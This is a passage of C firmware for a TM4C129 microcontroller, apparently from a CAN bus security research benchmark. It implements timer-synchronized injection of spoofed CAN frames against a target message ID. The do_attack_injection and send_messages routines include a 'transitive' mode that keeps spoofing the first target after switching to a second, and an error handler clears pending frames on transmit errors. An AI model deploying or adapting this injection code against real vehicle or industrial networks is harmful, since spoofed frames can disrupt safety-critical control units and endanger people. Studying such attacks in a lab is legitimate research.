Ipsitakoley/tm4c129-canbus/sae-benchmark/timers.c
}

void CAN0IntHandler(void)
{
    uint32_t ui32Status;

    IntMasterDisable();

    g_ui32LastCANIntTimer = TimerValueGet(TIMER3_BASE, TIMER_A);

    while ((ui32Status = CANIntStatus(CAN0_BASE, CAN_INT_STS_CAUSE)) != 0) {

        if(ui32Status == CAN_INT_INTID_STATUS) {
            ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);

            // if using abort on txerror, check for the tx error condition on the target ID
            // if an error occurs, just cancel the transmission blindly.
            if (g_ui32ExpCtrl & DISABLE_RETRANS_TXERR) {
                //uint8_t lec = ui32Status & CAN_STATUS_LEC_MSK;
                //if ( lec == CAN_STATUS_LEC_STUFF || lec == CAN_STATUS_LEC_BIT1 || lec == CAN_STATUS_LEC_BIT0 ) {
                if (ui32Status & CAN_STATUS_LEC_MSK) {
                    if (g_target_id == TARGET_ID ) {
                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
                    } else if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
                    }
                }
            }

            // Errors are handled in CANErrorHandler().
            g_ui32ErrFlag |= ui32Status;
        } else {
            switch(ui32Status) {
                case RXOBJECT: g_bRXFlag = true; break;
#if defined(SEND_RESET)
                case TXOBJECT_RESET: g_bRESETFlag = true; break;
#endif
                case TXOBJECT_5: g_bTXFlag_5 = true; break;
                case TXOBJECT_Target_1: g_bTXTarget_1 = true; break;
                case TXOBJECT_Target_2: g_bTXTarget_2 = true; break;
                case TXOBJECT_10: g_bTXFlag_10 = true; break;
                case TXOBJECT_100: g_bTXFlag_100 = true; break;
                case TXOBJECT_1000: g_bTXFlag_1000 = true; break;
                default: g_bTXFlag = ui32Status; break;
            }
            //got_CAN_msg_interrupt();
            CANIntClear(CAN0_BASE, ui32Status);
        }
    }
    IntMasterEnable();
}

void do_attack_injection(uint32_t count)
{
    static uint16_t skip_cnt = 0;
    if (g_ui32ExpCtrl & ATTACK_MASK) {
        if ( g_sync == SYNC_MODE_SYNCHED && g_reset == false ) {
            if ( skip_cnt % g_skip_attack == 0 ) {
                if ( g_target_id == TARGET_ID ) {
                    CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
                } else {
                    if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                        CANMessageSet(CAN0_BASE, TXOBJECT_Target_2, &g_sCAN0TxMessage_Target_2, MSG_OBJ_TYPE_TX);
                    }
                }
            }
            ++skip_cnt;
        } else {
            skip_cnt = 0;
        }
    }
}

void send_messages(uint32_t count)
{
    if (g_reset == false) {
        if (HIGH_PRIO_ID < g_target_id ) {
            if (g_sCAN0TxMessage_5) {
                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
            }
            if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
                do_attack_injection(count);
            }
        } else {
            if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
                do_attack_injection(count);
            }
            if (g_sCAN0TxMessage_5) {
                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
            }
        }

        // spoof the first target's messages after transition, assume it is always a 5 or 10 ms periodic message...
        if ((g_ui32ExpCtrl & ATTACK_TRANSITIVE) && g_target_id == TARGET_ID_2 ) {
            if (TARGET_ID < 0xAF || count % 2 == 0) {
                CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
            }
        }

        if ( count % 2 == 0 && g_sCAN0TxMessage_10) {
            CANMessageSet(CAN0_BASE, TXOBJECT_10, g_sCAN0TxMessage_10, MSG_OBJ_TYPE_TX);
        }

        if (count % 20 == 0 && g_sCAN0TxMessage_100) {
            CANMessageSet(CAN0_BASE, TXOBJECT_100, g_sCAN0TxMessage_100, MSG_OBJ_TYPE_TX);
        }

        if ( count % 200 == 0 ) {
            g_pin0 ^= 1;
            GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_0, g_pin0);
            if (g_sCAN0TxMessage_1000) {
                CANMessageSet(CAN0_BASE, TXOBJECT_100, g_sCAN0TxMessage_1000, MSG_OBJ_TYPE_TX);
            }
        }
    }

#if defined(SEND_RESET)
#define SECONDS(x) (200*x)
#define RESET_PERIOD SECONDS(RESET_PERIOD_SECONDS)
    if ( count % RESET_PERIOD == 0 ) {
        g_ui8TXMsgData_RESET[0] = (g_ui8TXMsgData_RESET[0] + 1) % 256;
        CANMessageSet(CAN0_BASE, TXOBJECT_RESET, &g_sCAN0TxMessage_RESET, MSG_OBJ_TYPE_TX);
    }
#endif

}

void send_messages_2(uint32_t count)
{
    if ( count % 200 == 0 ) {
        g_pin_2 ^= 1;
        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, g_pin_2);
    }
}

void Timer0IntHandler(void)
{
    TimerIntClear(TIMER0_BASE, TIMER_TIMA_TIMEOUT);
    g_tick = true;

#if 0
    if (g_ui32ExpCtrl & (SYNC_0PHASE | SYNC_PERIOD)) {
        if (g_sync == SYNC_MODE_RESYNCH) {
            TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
            g_sync = SYNC_MODE_SYNCHED;
        }
    } else {
        g_sync = SYNC_MODE_SYNCHED;
    }
#endif
}

void Timer1IntHandler(void)
{
    //uint32_t count;

    TimerIntClear(TIMER1_BASE, TIMER_TIMA_TIMEOUT);
    g_tick_2 = true;

    //TimerEnable(TIMER0_BASE, TIMER_A);
}

void Timer2IntHandler(void)
{
    TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
    TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
    TimerEnable(TIMER0_BASE, TIMER_A);
    TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
    //TimerEnable(TIMER1_BASE, TIMER_A);
    TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);

    if (g_sync == SYNC_MODE_INIT) {
        TimerLoadSet(TIMER2_BASE, TIMER_A, LATENCY_8B_MAX);
        TimerEnable(TIMER2_BASE, TIMER_A);
        g_sync = SYNC_MODE_RESET;
    } else if (g_sync == SYNC_MODE_ADJUST) {
        TimerDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
        g_sync = SYNC_MODE_SYNCHED;
        g_tick = true;  // TODO maybe too much jitter for the first injection?
    } else {
        // this really shouldn't happen, but let's poll timer 2.
        TimerLoadSet(TIMER2_BASE, TIMER_A, LATENCY_8B_MAX);
    }
}

